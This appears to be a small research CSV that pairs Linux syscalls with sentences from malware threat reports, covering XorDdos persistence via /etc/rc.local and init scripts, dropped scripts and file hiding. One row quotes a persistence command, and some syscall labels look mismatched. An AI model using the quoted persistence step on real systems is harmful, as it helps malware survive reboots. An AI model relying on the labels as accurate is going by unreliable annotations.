Syscall,Sentence,FirstLine,Synonym,SynonymSentence
link(),Screenshot of the randomly-named files the XorDdos rootkit extracts to the /usr/bin folder.,"<extract to,the /usr/bin folder.>","<,>",
link(),This Backdoor adds the following processes: sed -i -e '/exit/d' /etc/rc.local,"<add,processes: sed -i -e '/exit/d' /etc/rc.local>","<,>",
link(),The file k.sh that was dropped and executed on the attacked server,"<drop on,the attacked server>","<,>",
mkdir(),big-ip mounts the /usr partition read-only.,"<mount,the /usr partition>","<,>",
open(),Screenshot of the randomly-named files the XorDdos rootkit extracts to the /usr/bin folder.,"<extract to, the /usr/bin folder.>","<,>",
open(),Persistence is achieved by the malware by adding to /etc/rc.local and the /etc/init.d/boot.local files (in the auto_boot function);,"<add to, /etc/rc.local and the /etc/init.d/boot.local files>","<,>",
open(),The malware drops an init script at the location /etc/init.d.,"<drop,an init script at the location /etc/init.d.>","<,>",
open(),one reason for the daemon process to change the directory to the root partition (“/“)is because running the process from the mounted file system prevents unmounting unless the process is stopped.,"<mount,file system prevents unmounting>","<,>",
openat(),big-ip mounts the /usr partition read-only.,"<mount,the /usr partition read-only.>","<,>",
symlink(),Screenshot of the randomly-named files the XorDdos rootkit extracts to the /usr/bin folder.,"<extract to,the /usr/bin folder.>","<,>",
symlink(),This Backdoor adds the following processes: sed -i -e '/exit/d' /etc/rc.local,"<add,processes: sed -i -e '/exit/d' /etc/rc.local>","<,>",
symlink(),The file k.sh that was dropped and executed on the attacked server,"<drop on,the attacked server>","<,>",
remove(),drop the file from the victim machine,"<drop,the file from the victim machine>","<,>",
rm(),This worm deletes the following files,"<delete,the following files>","<,>",
rm(),drops each specified file,"<drop,each specified file>","<,>",
rmdir(),drop the file from the victim machine,"<drop,the file from the victim machine>","<,>",
unlinkat(),drop the file from the victim machine,"<drop,the file from the victim machine>","<,>",
read(),"Once the malware has infected a system, it can gather system information, including model ID and CPU description, speed, family, model, and type.","<gather,system information, including model ID and CPU description, speed, family, model, and type.>","<,>",
read(),"The user mode malware calls the function getself(), which invokes readlink() to fetch the location of the malware file image on disk.","<fetch,the location of the malware file image on disk.>","<,>",
read(),"As shown in Figure 6, the malware looks up its current path and moves the binary to the created folder. It hides the file by naming it “.po1kitd-update-k”.","<look up, its current path and moves the binary to the created folder. It hides the file by naming it “.po1kitd-update-k”.>","<,>",
read(),campaigns started spreading to the cloud following the drop in activity seen by ransomware operations after the end of 2017.,"<see,by ransomware operations after the end of 2017.>","<,>",
